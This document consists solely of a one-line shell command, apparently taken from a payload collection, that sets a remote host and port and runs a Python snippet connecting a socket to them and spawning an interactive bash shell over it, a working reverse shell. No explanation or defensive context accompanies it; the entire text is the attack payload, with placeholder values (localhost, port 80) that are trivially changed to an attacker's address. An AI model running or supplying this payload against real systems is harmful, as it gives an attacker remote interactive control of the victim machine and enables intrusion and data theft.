export RHOST="127.0.0.1"; export RPORT=80; python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("bash");'
